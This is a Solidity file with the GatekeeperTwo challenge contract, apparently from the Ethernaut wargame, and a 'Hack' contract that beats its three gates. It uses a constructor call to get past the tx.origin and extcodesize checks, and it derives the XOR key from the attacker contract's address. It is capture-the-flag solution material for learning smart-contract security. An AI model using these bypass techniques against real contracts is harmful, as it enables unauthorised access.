// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}



contract Hack{
    constructor (GatekeeperTwo _target){
        // 1 can be passed by calling from a contract
        // 2 can be pass if called from constructor 

        // 3rd need to know a^a^b = b

        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); // remember sender should be the contract(this)
        // by above rule uint64 key = type(uint64).max ^ s
        uint64 k = type(uint64).max ^ s;

        bytes8 key = bytes8(k);
        require(_target.enter(key),"failed");
    }
}
